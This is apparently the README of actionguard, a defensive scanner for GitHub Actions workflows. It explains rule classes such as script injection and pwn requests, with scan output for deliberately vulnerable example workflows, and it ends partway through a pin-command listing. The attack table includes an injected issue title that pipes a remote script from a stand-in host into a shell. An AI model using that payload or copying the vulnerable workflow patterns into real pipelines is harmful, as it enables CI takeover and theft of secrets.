# actionguard

[![CI](https://github.com/Opsbreak/actionguard/actions/workflows/ci.yml/badge.svg)](https://github.com/Opsbreak/actionguard/actions/workflows/ci.yml)

**Static security analysis for GitHub Actions workflows.** actionguard finds script
injection, pwn requests, artifact poisoning, `GITHUB_ENV` injection, unpinned actions,
over-privileged tokens, exposed secrets and bypassable guards -- with exact line/column
locations, data-flow traces you can follow, and SARIF output for GitHub code scanning.

It is a single Python package with one dependency (PyYAML), scans fully offline, and is built by
[Opsbreak](https://opsbreak.com), a Canadian cloud and AI security company.

```console
$ pipx install git+https://github.com/Opsbreak/actionguard
$ actionguard scan            # scans .github/workflows in the current directory
```

---

## Contents

- [Why this exists](#why-this-exists)
- [Install](#install)
- [Usage](#usage)
- [Example output](#example-output)
- [Rules](#rules)
- [How taint tracking works](#how-taint-tracking-works)
- [GitHub code scanning (SARIF)](#github-code-scanning-sarif)
- [Pinning actions to commit SHAs](#pinning-actions-to-commit-shas)
- [Configuration](#configuration)
- [Suppressing findings](#suppressing-findings)
- [Limitations](#limitations)
- [Contributing](#contributing)

## Why this exists

CI/CD pipelines hold the keys to the kingdom: deploy credentials, package-registry tokens,
cloud roles via OIDC and a `GITHUB_TOKEN` that can often push code. GitHub Actions
workflows are also unusually easy to get wrong, because untrusted input arrives through
many side doors and a single YAML line decides whether it is treated as data or as code.
The attack classes actionguard targets are all publicly documented and have been
exploited in real projects:

| Attack class | What goes wrong | Rule |
|---|---|---|
| **Script injection** | `${{ github.event.issue.title }}` is pasted into a `run:` script *before* bash parses it; an issue titled `"; curl evil.sh \| sh; #` runs code with the job's token and secrets. | AG001 |
| **Pwn request** | A `pull_request_target` / `workflow_run` / `issue_comment` workflow (which has secrets and a write token, even for forks) checks out the PR head and runs `npm install`, `make` or a local action -- i.e. the attacker's code. | AG002 |
| **Mutable action references** | `uses: org/action@v4` follows a tag the action's owner (or whoever compromises them) can repoint. The March 2025 compromise of `tj-actions/changed-files` (CVE-2025-30066), an action used by thousands of repositories, worked exactly this way: its tags were repointed to a commit that dumped CI secrets into build logs. | AG003 |
| **Over-privileged tokens** | Without `permissions:`, every job inherits the repository default, which can be read/write on every scope; any other bug becomes a repository takeover. | AG004 |
| **Self-hosted runners on public PRs** | PR authors execute code on your infrastructure and can persist on non-ephemeral runners (as shown in published research on PyTorch's runners, 2024). | AG005 |
| **Secret exposure** | `secrets: inherit` to an unpinned external reusable workflow, or secrets passed to steps that run next to checked-out PR code. | AG006 |
| **Artifact poisoning** | A privileged `workflow_run` job extracts an artifact produced by a fork's run into its workspace, overwriting files it then executes or trusts. | AG007 |
| **Environment-file injection** | Untrusted text written to `$GITHUB_ENV` / `$GITHUB_PATH` can define `BASH_ENV`, `LD_PRELOAD` or `NODE_OPTIONS`, or shadow binaries, for every later step. | AG008 |
| **Token leakage via checkout** | `actions/checkout` persists the token in `.git/config`; uploading the workspace publishes it (the "ArtiPACKED" class). | AG009 |
| **Bypassable guards** | `if: contains(github.event.comment.body, '/deploy')` is not authorization -- anyone can comment. And `if: ${{ a }} && b` is a non-empty string, which is always true. | AG010 |

actionguard focuses on *security* semantics. It complements, rather than replaces,
[actionlint](https://github.com/rhysd/actionlint), which type-checks workflow syntax.

## Install

Requires Python 3.10 or newer.

```console
# recommended: isolated install
pipx install git+https://github.com/Opsbreak/actionguard

# or into the current environment
python -m pip install "actionguard @ git+https://github.com/Opsbreak/actionguard"

# from a clone, for development
python -m pip install -e ".[dev]"
```

## Usage

```text
actionguard scan [PATHS...]   scan workflows and composite actions
actionguard pin [PATHS...]    pin action references to full commit SHAs
actionguard rules [IDS...]    list rules / show full rule documentation
```

`PATHS` can be workflow or `action.yml` files, directories, or repository roots. With no
paths, `.github/workflows` in the current directory is scanned. For a repository root
(a directory containing `.github/`), actionguard scans `.github/workflows/*`, a root
`action.yml`, and composite actions under `.github/actions/`. Any other directory is
searched recursively for YAML files; files that are neither workflows nor actions are
skipped. Malformed YAML is reported as an `AG000` finding and the scan continues.

| Option | Meaning |
|---|---|
| `-f, --format {text,json,sarif,markdown}` | Output format (default `text`; colored when stdout is a TTY). |
| `-o, --output FILE` | Write the report to a file. |
| `--fail-on {info,low,medium,high,critical,none}` | Exit 1 if any finding is at or above this severity (default `low`). |
| `--min-severity LEVEL` | Hide findings below this severity. |
| `--select AG001,AG002` / `--ignore AG003` | Run only / skip rules. Repeatable. |
| `--config FILE` / `--no-config` | Use a specific config file / ignore `.actionguard.yml`. |
| `--color {auto,always,never}` | Color control. `NO_COLOR` and `FORCE_COLOR` are honoured. |

Exit codes: `0` no findings at or above `--fail-on`; `1` findings at or above it (or, for
`pin`, references that could not be resolved); `2` usage or configuration error.

The `markdown` format is designed for `$GITHUB_STEP_SUMMARY` and PR comments.

## Example output

The repository ships deliberately vulnerable workflows in
[`examples/vulnerable-repo`](examples/vulnerable-repo/.github) (each modelled on a real
vulnerability class) and fixed counterparts in
[`examples/hardened-repo`](examples/hardened-repo/.github). Everything below is
unedited output from running actionguard on them.

`comment-ops.yml` is a ChatOps workflow: anyone can comment `/deploy`, the job runs on a
self-hosted runner, checks out the PR and runs it with a deploy key, and the comment text
reaches a second job through a job output:

```console
$ actionguard scan examples/vulnerable-repo/.github/workflows/comment-ops.yml
examples/vulnerable-repo/.github/workflows/comment-ops.yml
  11:1  LOW  AG004 No `permissions:` block at workflow level or for job(s) `deploy`, `announce`; their token inherits the repository default, which may be read/write on all scopes (triggered by `issue_comment`)
       |
    11 | jobs:
       | ^^^^^
  13:5  HIGH  AG010 Job `deploy` (`issue_comment`) is gated only on the comment text (`github.event.issue.pull_request && contains(github.event.comment.body, '/deploy')`); any user who can comment can trigger it. Also check the commenter's author_association or repository permission
       |
    13 | if: github.event.issue.pull_request && contains(github.event.comment.body, '/deploy')
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: deploy
  14:5  HIGH  AG005 Job `deploy` runs on a self-hosted runner and is reachable from `issue_comment`; pull request authors can execute code on the runner host and persist across jobs
       |
    14 | runs-on: [self-hosted, linux, x64]
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: deploy
  21:26  CRITICAL  AG001 `${{ github.event.comment.body }}` expands untrusted `github.event.comment.body` directly into a `run:` script; an attacker can inject arbitrary shell commands
       |
    21 | TARGET=$(echo "${{ github.event.comment.body }}" | awk '{print $2}')
       |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: deploy, step: parse
  24:7  LOW  AG009 actions/checkout leaves the GITHUB_TOKEN in .git/config (persist-credentials defaults to true) and untrusted pull request code runs (line 32)
       |
    24 | - uses: actions/checkout@v4
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: deploy, step: actions/checkout@v4
    = line 32: untrusted pull request code runs here
  24:15  LOW  AG003 Action `actions/checkout` (first-party) is pinned to mutable tag `v4` instead of a full commit SHA
       |
    24 | - uses: actions/checkout@v4
       |         ^^^^^^^^^^^^^^^^^^^
    = job: deploy, step: actions/checkout@v4
  27:9  CRITICAL  AG002 Pwn request: this `issue_comment` workflow checks out untrusted pull request code (`gh pr checkout ${{ github.event.issue.number }}` fetches pull request code) and executes it at line 32 (step `Deploy`) with repository secrets and a privileged GITHUB_TOKEN
       |
    27 | run: gh pr checkout ${{ github.event.issue.number }}
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: deploy, step: Check out PR
    = line 32: workspace code is executed here
  34:11  HIGH  AG006 Secret(s) DEPLOY_KEY are provided to step `Deploy`, which runs after untrusted pull request code was checked out (line 27); that code can read them from the environment, files or process memory
       |
    34 | DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: deploy, step: Deploy
    = line 27: untrusted code is checked out here
  40:32  CRITICAL  AG001 `${{ needs.deploy.outputs.target }}` expands untrusted `github.event.comment.body` (via $TARGET (line 21) -> steps.parse.outputs.target (line 22) -> needs.deploy.outputs.target (line 16)) directly into a `run:` script; an attacker can inject arbitrary shell commands
       |
    40 | - run: echo "Deployed to ${{ needs.deploy.outputs.target }}"
       |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: announce, step: run: echo "Deployed to ${{ needs.deploy.outpu...

Found 9 findings in 1 of 1 file (3 critical, 3 high, 3 low).
```

Note the last finding: the injection sink is in the `announce` job, and actionguard shows
the full path the data took to get there (`comment.body` -> shell variable `$TARGET` ->
step output -> job output -> `needs.deploy.outputs.target`).

Scanning the whole vulnerable repository (five workflows and one composite action):

```console
$ actionguard scan examples/vulnerable-repo
...
Found 45 findings in 6 of 6 files (11 critical, 9 high, 11 medium, 14 low).
```

<details>
<summary>Full output (click to expand)</summary>

```text
examples/vulnerable-repo/.github/actions/setup-env/action.yml
  18:47  MEDIUM  AG001 `${{ inputs.version }}` expands untrusted `inputs.version` directly into a `run:` script; an attacker can inject arbitrary shell commands
       |
    18 | curl -sSfL "https://tools.example.com/${{ inputs.version }}/install.sh" -o install.sh
       |                                       ^^^^^^^^^^^^^^^^^^^^^
    = job: (composite), step: run: curl -sSfL "https://tools.example.com/${...
  20:9  MEDIUM  AG008 Untrusted `inputs.extra-path` is written to $GITHUB_PATH; an attacker can prepend a directory to PATH and hijack later commands
       |
    20 | echo "${{ inputs.extra-path }}" >> "$GITHUB_PATH"
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: (composite), step: run: curl -sSfL "https://tools.example.com/${...
  20:15  MEDIUM  AG001 `${{ inputs.extra-path }}` expands untrusted `inputs.extra-path` directly into a `run:` script; an attacker can inject arbitrary shell commands
       |
    20 | echo "${{ inputs.extra-path }}" >> "$GITHUB_PATH"
       |       ^^^^^^^^^^^^^^^^^^^^^^^^
    = job: (composite), step: run: curl -sSfL "https://tools.example.com/${...
  22:13  LOW  AG003 Action `actions/cache` (first-party) is pinned to mutable tag `v4` instead of a full commit SHA
       |
    22 | - uses: actions/cache@v4
       |         ^^^^^^^^^^^^^^^^
    = job: (composite), step: actions/cache@v4

examples/vulnerable-repo/.github/workflows/comment-ops.yml
  11:1  LOW  AG004 No `permissions:` block at workflow level or for job(s) `deploy`, `announce`; their token inherits the repository default, which may be read/write on all scopes (triggered by `issue_comment`)
       |
    11 | jobs:
       | ^^^^^
  13:5  HIGH  AG010 Job `deploy` (`issue_comment`) is gated only on the comment text (`github.event.issue.pull_request && contains(github.event.comment.body, '/deploy')`); any user who can comment can trigger it. Also check the commenter's author_association or repository permission
       |
    13 | if: github.event.issue.pull_request && contains(github.event.comment.body, '/deploy')
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: deploy
  14:5  HIGH  AG005 Job `deploy` runs on a self-hosted runner and is reachable from `issue_comment`; pull request authors can execute code on the runner host and persist across jobs
       |
    14 | runs-on: [self-hosted, linux, x64]
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: deploy
  21:26  CRITICAL  AG001 `${{ github.event.comment.body }}` expands untrusted `github.event.comment.body` directly into a `run:` script; an attacker can inject arbitrary shell commands
       |
    21 | TARGET=$(echo "${{ github.event.comment.body }}" | awk '{print $2}')
       |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: deploy, step: parse
  24:7  LOW  AG009 actions/checkout leaves the GITHUB_TOKEN in .git/config (persist-credentials defaults to true) and untrusted pull request code runs (line 32)
       |
    24 | - uses: actions/checkout@v4
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: deploy, step: actions/checkout@v4
    = line 32: untrusted pull request code runs here
  24:15  LOW  AG003 Action `actions/checkout` (first-party) is pinned to mutable tag `v4` instead of a full commit SHA
       |
    24 | - uses: actions/checkout@v4
       |         ^^^^^^^^^^^^^^^^^^^
    = job: deploy, step: actions/checkout@v4
  27:9  CRITICAL  AG002 Pwn request: this `issue_comment` workflow checks out untrusted pull request code (`gh pr checkout ${{ github.event.issue.number }}` fetches pull request code) and executes it at line 32 (step `Deploy`) with repository secrets and a privileged GITHUB_TOKEN
       |
    27 | run: gh pr checkout ${{ github.event.issue.number }}
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: deploy, step: Check out PR
    = line 32: workspace code is executed here
  34:11  HIGH  AG006 Secret(s) DEPLOY_KEY are provided to step `Deploy`, which runs after untrusted pull request code was checked out (line 27); that code can read them from the environment, files or process memory
       |
    34 | DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: deploy, step: Deploy
    = line 27: untrusted code is checked out here
  40:32  CRITICAL  AG001 `${{ needs.deploy.outputs.target }}` expands untrusted `github.event.comment.body` (via $TARGET (line 21) -> steps.parse.outputs.target (line 22) -> needs.deploy.outputs.target (line 16)) directly into a `run:` script; an attacker can inject arbitrary shell commands
       |
    40 | - run: echo "Deployed to ${{ needs.deploy.outputs.target }}"
       |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: announce, step: run: echo "Deployed to ${{ needs.deploy.outpu...

examples/vulnerable-repo/.github/workflows/issue-triage.yml
  23:18  CRITICAL  AG001 `${{ github.event.issue.title }}` expands untrusted `github.event.issue.title` directly into a `run:` script; an attacker can inject arbitrary shell commands
       |
    23 | if [[ "${{ github.event.issue.title }}" == *"crash"* ]]; then
       |        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: triage, step: Label crash reports
  36:30  CRITICAL  AG001 `${{ steps.meta.outputs.component }}` expands untrusted `github.event.issue.title` (via env.ISSUE_TITLE (line 18) -> $component (line 32) -> steps.meta.outputs.component (line 33)) directly into a `run:` script; an attacker can inject arbitrary shell commands
       |
    36 | run: echo "Component ${{ steps.meta.outputs.component }} reported in ${{ env.ISSUE_TITLE }}"
       |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: triage, step: Log
  36:78  CRITICAL  AG001 `${{ env.ISSUE_TITLE }}` expands untrusted `github.event.issue.title` (via env.ISSUE_TITLE (line 18)) directly into a `run:` script; an attacker can inject arbitrary shell commands
       |
    36 | run: echo "Component ${{ steps.meta.outputs.component }} reported in ${{ env.ISSUE_TITLE }}"
       |                                                                      ^^^^^^^^^^^^^^^^^^^^^^
    = job: triage, step: Log
  42:15  LOW  AG003 Action `actions/github-script` (first-party) is pinned to mutable tag `v7` instead of a full commit SHA
       |
    42 | uses: actions/github-script@v7
       |       ^^^^^^^^^^^^^^^^^^^^^^^^
    = job: triage, step: Thank the reporter
  45:27  CRITICAL  AG001 `${{ github.event.issue.body }}` expands untrusted `github.event.issue.body` directly into an actions/github-script `script:`; an attacker can inject arbitrary JavaScript
       |
    45 | const body = `${{ github.event.issue.body }}`;
       |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: triage, step: Thank the reporter

examples/vulnerable-repo/.github/workflows/post-ci.yml
  17:7  MEDIUM  AG004 `contents: write` is granted to the job `report` token in a workflow triggered by `workflow_run`, where outside contributors control the event
       |
    17 | contents: write
       | ^^^^^^^^^^^^^^^
    = job: report
  18:7  MEDIUM  AG004 `pull-requests: write` is granted to the job `report` token in a workflow triggered by `workflow_run`, where outside contributors control the event
       |
    18 | pull-requests: write
       | ^^^^^^^^^^^^^^^^^^^^
    = job: report
  20:15  LOW  AG003 Action `actions/checkout` (first-party) is pinned to mutable tag `v4` instead of a full commit SHA
       |
    20 | - uses: actions/checkout@v4
       |         ^^^^^^^^^^^^^^^^^^^
    = job: report, step: actions/checkout@v4
  23:9  HIGH  AG007 Artifacts from the triggering workflow run (actions/download-artifact (cross-run)) are extracted into the workspace root and workspace code is executed afterwards (line 35); a malicious artifact can overwrite files that this privileged job runs
       |
    23 | uses: actions/download-artifact@v4
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: report, step: Download build output
    = line 35: workspace code executed here
  23:15  LOW  AG003 Action `actions/download-artifact` (first-party) is pinned to mutable tag `v4` instead of a full commit SHA
       |
    23 | uses: actions/download-artifact@v4
       |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: report, step: Download build output
  32:11  CRITICAL  AG008 Untrusted `github.event.workflow_run.head_branch` is written to $GITHUB_ENV as `BRANCH`; an attacker can inject extra variables (e.g. BASH_ENV, LD_PRELOAD, NODE_OPTIONS) that execute code in later steps
       |
    32 | echo "BRANCH=${{ github.event.workflow_run.head_branch }}" >> $GITHUB_ENV
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: report, step: Read PR metadata
  32:24  CRITICAL  AG001 `${{ github.event.workflow_run.head_branch }}` expands untrusted `github.event.workflow_run.head_branch` directly into a `run:` script; an attacker can inject arbitrary shell commands
       |
    32 | echo "BRANCH=${{ github.event.workflow_run.head_branch }}" >> $GITHUB_ENV
       |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: report, step: Read PR metadata

examples/vulnerable-repo/.github/workflows/pr-preview.yml
  12:3  MEDIUM  AG004 `contents: write` is granted to the workflow token in a workflow triggered by `pull_request_target`, where outside contributors control the event
       |
    12 | contents: write
       | ^^^^^^^^^^^^^^^
  13:3  MEDIUM  AG004 `pull-requests: write` is granted to the workflow token in a workflow triggered by `pull_request_target`, where outside contributors control the event
       |
    13 | pull-requests: write
       | ^^^^^^^^^^^^^^^^^^^^
  19:7  HIGH  AG006 Job-level env exposes secret(s) NETLIFY_AUTH_TOKEN to every step, including code from the untrusted pull request checked out at line 23
       |
    19 | NETLIFY_AUTH_TOKEN: ${{ secrets.NETLIFY_AUTH_TOKEN }}
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: preview
    = line 23: untrusted code is checked out here
  21:7  LOW  AG009 actions/checkout leaves the GITHUB_TOKEN in .git/config (persist-credentials defaults to true) and untrusted pull request code runs (line 30)
       |
    21 | - uses: actions/checkout@v4
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: preview, step: actions/checkout@v4
    = line 30: untrusted pull request code runs here
  21:15  LOW  AG003 Action `actions/checkout` (first-party) is pinned to mutable tag `v4` instead of a full commit SHA
       |
    21 | - uses: actions/checkout@v4
       |         ^^^^^^^^^^^^^^^^^^^
    = job: preview, step: actions/checkout@v4
  23:11  CRITICAL  AG002 Pwn request: this `pull_request_target` workflow checks out untrusted pull request code (actions/checkout `ref:` resolves to `github.event.pull_request.head.sha`) and executes it at line 30 (step `Build`) with repository secrets and a privileged GITHUB_TOKEN
       |
    23 | ref: ${{ github.event.pull_request.head.sha }}
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: preview, step: actions/checkout@v4
    = line 30: workspace code is executed here
  25:15  LOW  AG003 Action `actions/setup-node` (first-party) is pinned to mutable tag `v4` instead of a full commit SHA
       |
    25 | - uses: actions/setup-node@v4
       |         ^^^^^^^^^^^^^^^^^^^^^
    = job: preview, step: actions/setup-node@v4
  35:15  MEDIUM  AG003 Action `nwtgck/actions-netlify` (third-party) is pinned to mutable tag `v3` instead of a full commit SHA
       |
    35 | uses: nwtgck/actions-netlify@v3
       |       ^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: preview, step: Deploy preview
  38:11  MEDIUM  AG006 Secret(s) GITHUB_TOKEN are provided to step `Deploy preview`, which runs after untrusted pull request code was checked out (line 23); that code can read them from the environment, files or process memory
       |
    38 | github-token: ${{ secrets.GITHUB_TOKEN }}
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: preview, step: Deploy preview
    = line 23: untrusted code is checked out here
  44:40  CRITICAL  AG001 `${{ github.head_ref }}` expands untrusted `github.head_ref` directly into a `run:` script; an attacker can inject arbitrary shell commands
       |
    44 | --body "Preview for branch ${{ github.head_ref }} is ready"
       |                            ^^^^^^^^^^^^^^^^^^^^^^
    = job: preview, step: Comment
  46:11  MEDIUM  AG006 Secret(s) GITHUB_TOKEN are provided to step `Comment`, which runs after untrusted pull request code was checked out (line 23); that code can read them from the environment, files or process memory
       |
    46 | GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: preview, step: Comment
    = line 23: untrusted code is checked out here

examples/vulnerable-repo/.github/workflows/release.yml
  20:1  HIGH  AG004 `permissions: write-all` grants the workflow token write access to every scope
       |
    20 | permissions: write-all
       | ^^^^^^^^^^^^^^^^^^^^^^
  24:11  HIGH  AG003 Reusable workflow `example-org/shared-workflows/.github/workflows/build.yml` (third-party) is pinned to mutable branch `main` instead of a full commit SHA
       |
    24 | uses: example-org/shared-workflows/.github/workflows/build.yml@main
       |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: build
  25:5  HIGH  AG006 `secrets: inherit` passes every secret to reusable workflow `example-org/shared-workflows/.github/workflows/build.yml@main`, which lives in another repository and is not pinned to a commit SHA; whoever can move that ref receives all of them
       |
    25 | secrets: inherit
       | ^^^^^^^^^^^^^^^^
    = job: build
  31:7  LOW  AG009 actions/checkout leaves the GITHUB_TOKEN in .git/config (persist-credentials defaults to true) and the workspace is uploaded as an artifact (line 43)
       |
    31 | - uses: actions/checkout@v4
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: publish, step: actions/checkout@v4
    = line 43: the workspace is uploaded as an artifact here
  31:15  LOW  AG003 Action `actions/checkout` (first-party) is pinned to mutable tag `v4` instead of a full commit SHA
       |
    31 | - uses: actions/checkout@v4
       |         ^^^^^^^^^^^^^^^^^^^
    = job: publish, step: actions/checkout@v4
  33:15  MEDIUM  AG003 Container image `docker://ghcr.io/example-org/release-tool:latest` is referenced by a mutable tag; pin it by digest (`@sha256:...`)
       |
    33 | - uses: docker://ghcr.io/example-org/release-tool:latest
       |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: publish, step: docker://ghcr.io/example-org/release-tool:latest
  36:9  HIGH  AG010 `if: ${{ github.ref_type == 'tag' }} && ${{ !inputs.dry-run }}` mixes literal text with a `${{ }}` expression; it evaluates to a non-empty string, which is always true, so this guard never blocks
       |
    36 | if: ${{ github.ref_type == 'tag' }} && ${{ !inputs.dry-run }}
       | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: publish, step: Create release
  38:63  LOW  AG001 `${{ inputs.notes }}` expands untrusted `inputs.notes` directly into a `run:` script; an attacker can inject arbitrary shell commands
       |
    38 | gh release create "${{ github.ref_name }}" --notes "${{ inputs.notes }}"
       |                                                     ^^^^^^^^^^^^^^^^^^^
    = job: publish, step: Create release
  43:15  LOW  AG003 Action `actions/upload-artifact` (first-party) is pinned to mutable tag `v4` instead of a full commit SHA
       |
    43 | uses: actions/upload-artifact@v4
       |       ^^^^^^^^^^^^^^^^^^^^^^^^^^
    = job: publish, step: Upload bundle

Found 45 findings in 6 of 6 files (11 critical, 9 high, 11 medium, 14 low).
```

</details>

The hardened versions scan clean. The single suppression is a deliberate, documented
`pull-requests: write` permission (see [Suppressing findings](#suppressing-findings)):

```console
$ actionguard scan examples/hardened-repo
No findings in 8 files. 1 suppressed.
```

## Rules

```console
$ actionguard rules
ID     SEVERITY  NAME                   TITLE
AG000  high      parse-error            File could not be parsed
AG001  critical  script-injection       Script injection via untrusted input in run/script
AG002  critical  pwn-request            Untrusted pull request code executed in a privileged context (pwn request)
AG003  medium    unpinned-uses          Action or reusable workflow not pinned to an immutable commit SHA
AG004  high      excessive-permissions  Excessive or implicit GITHUB_TOKEN permissions
AG005  high      self-hosted-runner     Self-hosted runner reachable from pull request triggers
AG006  high      secrets-exposure       Secrets exposed to untrusted code or unpinned reusable workflows
AG007  high      artifact-poisoning     Artifact poisoning: untrusted artifacts extracted into the workspace
AG008  critical  github-env-injection   Untrusted data written to GITHUB_ENV / GITHUB_PATH
AG009  low       persisted-credentials  actions/checkout persists the GITHUB_TOKEN where untrusted code or artifacts can reach it
AG010  high      bypassable-if-guard    Bypassable `if:` guard on a dangerous trigger

Run `actionguard rules <ID>` for full documentation.
```

Full documentation for each rule (description, remediation, references) is available via
`actionguard rules AG002` and in [docs/rules.md](docs/rules.md).

Severity is assigned per finding, not just per rule. For example, AG001 is **critical**
when the workflow runs on an event that grants secrets to outsider-controlled content
(`pull_request_target`, `issue_comment`, `issues`, `workflow_run`, `discussion*`),
**high** otherwise, **medium** for `workflow_call` / composite-action inputs (it depends on
the caller), and **low** for `workflow_dispatch` inputs (which need write access).
Inputs typed `boolean`, `number`, `choice` or `environment` are never reported.

## How taint tracking works

1. **Parsing with positions.** Workflows are parsed with a position-preserving PyYAML
   loader, so every value -- including each line inside a `run: |` block -- maps back to
   an exact line and column. (`on:` is kept as a string key, not YAML 1.1's `True`.)
2. **A real expression parser.** Every `${{ }}` block is tokenised and parsed into an AST.
   Context references are normalised, so `github.event['pull_request']['title']`,
   `github.event.pull_request.title` and `GitHub.Event.Pull_Request.Title` are the same
   thing, and `commits[0].message` matches the `commits.*.message` pattern.
3. **Value flow, not string matching.** Only references whose *value* can reach the
   result count. `contains(github.event.issue.title, 'bug')` and
   `github.head_ref == 'main'` produce booleans and are not injection;
   `format('{0}', github.event.issue.title)`, `join(...)`, `toJSON(...)`, `a || b` and
   `case(...)` propagate their inputs.
4. **Sources.** A curated catalogue of attacker-controlled contexts (issue / PR /
   comment / review / discussion text, `head_ref`, PR head labels, commit messages and
   author names, wiki page names, `workflow_run` head branch and commit data, ...), plus
   `inputs.*` with trigger- and type-aware severity, plus outputs of actions known to emit
   attacker-controlled values (e.g. changed-file lists). Add your own via config.
5. **Propagation.** Taint flows through workflow/job/step `env:` (with correct
   shadowing), `$GITHUB_ENV` writes into later steps, step outputs (`$GITHUB_OUTPUT`,
   multi-line `NAME<<EOF` values, `::set-output`, `core.setOutput`), simple shell
   assignments inside a script (`T="$TITLE"` then `echo "x=$T" >> "$GITHUB_OUTPUT"`), job
   `outputs:` into `needs.<job>.outputs.*` (to a fixed point across the job graph), and
   `strategy.matrix` values.
6. **Sinks.** `${{ }}` inside `run:` and inside `actions/github-script`'s `script:` is a
   code sink (AG001). Writes to `$GITHUB_ENV` / `$GITHUB_PATH` are sinks whether the data
   arrives via `${{ }}` or a shell variable (AG008). Referencing a tainted env var as a
   shell variable (`"$TITLE"`) is the recommended fix and is **not** reported by AG001.

```yaml
env:
  TITLE: ${{ github.event.issue.title }}   # taint source bound to env
steps:
  - run: echo "$TITLE"                     # safe: data stays data
  - run: echo "${{ env.TITLE }}"           # AG001: re-expanded into the script
  - run: echo "T=$TITLE" >> "$GITHUB_ENV"  # AG008: can inject BASH_ENV etc.
```

## GitHub code scanning (SARIF)

`--format sarif` emits SARIF 2.1.0 with full rule metadata (descriptions, help markdown,
`security-severity`, tags), physical locations with snippets, related locations (e.g. the
checkout *and* the execution line of a pwn request) and line-independent
`partialFingerprints`, so alerts stay stable as files change. A complete workflow:

```yaml
name: actionguard

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

jobs:
  actionguard:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write # upload SARIF to code scanning
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.13"

      - name: Install actionguard
        run: python -m pip install "actionguard @ git+https://github.com/Opsbreak/actionguard@main"

      - name: Scan workflows
        run: actionguard scan --format sarif --output actionguard.sarif --fail-on none

      - uses: github/codeql-action/upload-sarif@24c54180a607b1449ed407dd24f251e4e9147c8d # v4.38.3
        with:
          sarif_file: actionguard.sarif
          category: actionguard

      - name: Gate on high-severity findings
        run: actionguard scan --fail-on high
```

The action references above are real, pinned commit SHAs (resolved with
`actionguard pin`). For supply-chain hygiene, replace `@main` in the install step with a
specific actionguard commit SHA.

## Pinning actions to commit SHAs

`actionguard pin` rewrites `uses:` references from tags/branches to full commit SHAs and
keeps a version comment, resolving the *most specific* tag that points at the same commit
(`@v4` becomes `@<sha> # v4.2.2`, not `# v4`). Annotated tags are peeled to their commit.
It is a dry run unless `--write` is given; indentation, quoting, CRLF line endings and
unrelated trailing comments are preserved.

```console
$ actionguard pin examples/vulnerable-repo
examples/vulnerable-repo/.github/workflows/comment-ops.yml:24: actions/checkout@v4 -> actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
examples/vulnerable-repo/.github/workflows/issue-triage.yml:42: actions/github-script@v7 -> actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b # v7.1.0
examples/vulnerable-repo/.github/workflows/post-ci.yml:20: actions/checkout@v4 -> actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
examples/vulnerable-repo/.github/workflows/post-ci.yml:23: actions/download-artifact@v4 -> actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
